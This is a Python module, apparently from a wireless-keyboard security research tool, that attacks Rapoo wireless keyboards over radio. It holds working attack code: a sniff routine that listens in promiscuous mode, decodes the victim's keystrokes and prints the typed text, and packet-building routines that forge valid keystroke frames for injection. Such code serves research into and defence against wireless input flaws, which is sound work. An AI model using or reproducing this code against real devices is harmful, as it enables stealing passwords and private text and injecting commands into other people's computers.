import crcmod
from binascii import unhexlify

from devices.Rapoo.rapoo import Rapoo
from devices.keyboard import * 
import time
from lib import common


class Rapoo_Keyboard(Rapoo):


    def __init__(self, address, crc_poly, crc_init):
        super().__init__(address, crcmod.mkCrcFun(crc_poly, initCrc=crc_init, rev=False, xorOut=0x0000))
        self.sequence_number = 0


    def parse_packet(self, packet):
        p = packet[:self.PACKET_SIZE]
        return {"address" :         p[:self.ADDRESS_LENGTH].hex(),
                "payload" :         p[:-self.CRC_SIZE].hex(),
                "packet type" :     p[6:7].hex(),
                "sequence number":  p[7:8].hex(),
                "array":            [hex(item) for item in p[-(6+self.CRC_SIZE):-self.CRC_SIZE]],
                "crc" :             p[-self.CRC_SIZE:].hex()
                }
    

    def scancode_to_char(self, array):
        modifiers = 0
        shifted = False
        for scancode in array: # grab potential modifiers
            value = int(scancode, 16)
            if value == KeyboardScancode.KEY_LSHIFT.value or value == KeyboardScancode.KEY_RSHIFT.value and not shifted:
                modifiers += 1
                shifted = True # avoid incrementing modifier 2 times in case we press L and R shift at the same time
            elif value == KeyboardScancode .KEY_RALT.value:
                modifiers += 2
        chars = ""
        for scancode in array:
            chars += KeyboardScancode.SCANCODE_TO_CHAR.value.get((int(scancode, 16), modifiers), "")
        return chars


    def build_packet(self, scancodes=[]):
        address = unhexlify(self.address.replace(':', ''))
        beginning_payload = b"\xdc\x69\x06"
        sequence_number = self.sequence_number.to_bytes(1, "big")
        self.sequence_number = (self.sequence_number + 1) % 255
        padding = b"\x01\x02\xea\x3a\x16"
        array = self.build_array(scancodes)
        crc = self.calculate_crc(address+beginning_payload+sequence_number+padding+array)
        
        return address+beginning_payload+sequence_number+padding+array+crc
    

    def build_array(self, scancodes):
        array = b""
        for i in range(len(scancodes)):
            if i == 6 :
                break
            if scancodes[i] in KeyboardScancode:
                array += scancodes[i].value.to_bytes(1, "big")
        array += unhexlify("00" * (6 - len(scancodes)))
        return array
    

    def sniff(self):
        dwell = 200
        dwell_time = dwell / 1000

        channels = self.CHANNELS
        #channels = range(0,84) # for fuzzing
        byte_address = unhexlify(self.address.replace(':', ''))

        channel_index = 0
        common.radio.set_channel(channels[channel_index]) # Set channel here to prevent USBError (somehow)
        common.radio.enter_promiscuous_mode_generic(unhexlify(self.address.replace(':', '')), rate=self.RATE)
        last_tune = time.time()
        entered_string = ""

        while True:
            # Increment the channel after dwell_time
            if len(channels) > 1 and time.time() - last_tune > dwell_time:
                channel_index = (channel_index + 1) % (len(channels))
                common.radio.set_channel(channels[channel_index])
                last_tune = time.time()

            value = common.radio.receive_payload()
            if len(value) >= self.ADDRESS_LENGTH:
                found_base_address = bytes(value[:self.ADDRESS_LENGTH])
                if found_base_address == byte_address:
                    packet = self.parse_packet(bytes(value))
                    if self.check_crc(packet["crc"], packet["payload"]):
                        if packet["packet type"] == "06":
                            print(f"Rapoo Keyboard Packet\tCHANNEL : {channels[channel_index]}")
                            print(packet)
                            entered_string += self.scancode_to_char(packet["array"])
                            print(entered_string)
                            last_tune = time.time()
    